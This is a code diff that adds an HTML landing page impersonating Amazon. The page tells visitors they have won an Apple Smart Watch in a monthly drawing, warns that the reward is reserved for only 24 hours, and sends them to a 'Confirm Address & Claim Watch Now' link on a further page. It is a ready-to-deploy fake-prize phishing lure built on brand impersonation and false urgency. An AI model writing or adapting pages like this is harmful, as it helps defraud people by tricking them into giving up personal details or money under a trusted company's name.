@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A pleasant surprise from Amazon!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-[#F3F3F3] flex flex-col min-h-screen justify-between text-[#111111]">
+
+    <!-- Header with Amazon Logo - Matching page2 and page3 -->
+    <header class="bg-[#131A22] shadow-md p-4 flex items-center max-w-md mx-auto w-full text-white border-b border-[#232F3E]">
+        <div class="flex items-center gap-2">
+            <!-- Base64 Amazon Logo -->
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAADvklEQVR4nO3bS2hcVRTG8f9Jpm3SND7S+EibpE3atI9atU8UFRVcuBFdiIIuXAqKtSD4AFFQFAqCjvhYFwVfKKgIguvChSg" alt="Amazon logo">
+            <!-- Amazon brand typography #FF9900 -->
+            <span class="text-xl font-black text-[#FF9900] tracking-wide ml-1">amazon</span>
+        </div>
+    </header>
+
+    <!-- Main Content Area - Shortened -->
+    <main class="flex-grow flex flex-col items-center justify-center px-4 py-4 text-center max-w-md mx-auto w-full">
+
+        <!-- Gift Icon #FF9900 - Smaller -->
+        <div class="w-full max-w-[80px] mb-4 text-[#FF9900] opacity-95">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-full h-auto">
+                <path d="M20 12v10H4V12M2 7h20v5H2zM12 22V7M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/>
+            </svg>
+        </div>
+
+        <h1 class="text-2xl font-black text-[#111111] mb-2 leading-tight">
+            Congratulations! You <span class="text-[#FF9900]">have won</span><br>
+            an <span class="text-[#232F3E]">Apple Smart Watch</span>!
+        </h1>
+
+        <p class="text-[#111111] opacity-80 text-sm mb-4 leading-relaxed">
+            Selected in Amazon's monthly drawing. Your watch is ready for shipping.
+        </p>
+
+        <!-- Dynamic Notice Box - Smaller -->
+        <div class="bg-[#FFFFFF] border border-[#232F3E]/20 rounded-xl p-3 w-full mb-4 text-left flex items-start gap-2 shadow-sm">
+            <span class="text-base mt-0.5">⚠️</span>
+            <div>
+                <h4 class="font-bold text-[#111111] text-xs">Important Notice:</h4>
+                <p class="text-[10px] text-[#111111] opacity-75 leading-relaxed">Reward reserved under your name for the next 24 hours only.</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Sticky Bottom Action Button Area -->
+    <div class="p-4 bg-[#FFFFFF] border-t border-[#F3F3F3] max-w-md w-full mx-auto sticky bottom-0 z-10">
+        <a href="/page2" class="block w-full text-center bg-[#FF9900] hover:bg-[#FFB84D] text-[#FFFFFF] font-bold py-3.5 px-4 rounded-2xl shadow-lg transition-all duration-200 active:scale-[0.98] text-sm">
+            Confirm Address & Claim Watch Now ➔
+        </a>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-[#232F3E] border-t border-[#131A22] py-4 text-center text-xs text-[#FFFFFF]/70 w-full mt-auto">
+        <div class="max-w-md mx-auto px-4">
+            <div class="flex justify-center gap-4 mb-2">
+                <a href="/user-agreement" class="hover:underline hover:text-[#FFFFFF]">User Agreement</a>
+                <a href="/privacy-policy" class="hover:underline hover:text-[#FFFFFF]">Privacy Notice</a>
+                <a href="/contact-us" class="hover:underline hover:text-[#FFFFFF]">Contact Us</a>
+            </div>
+            <p class="text-[#FFFFFF]/50">&copy; 1996-2026, Amazon.com, Inc.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
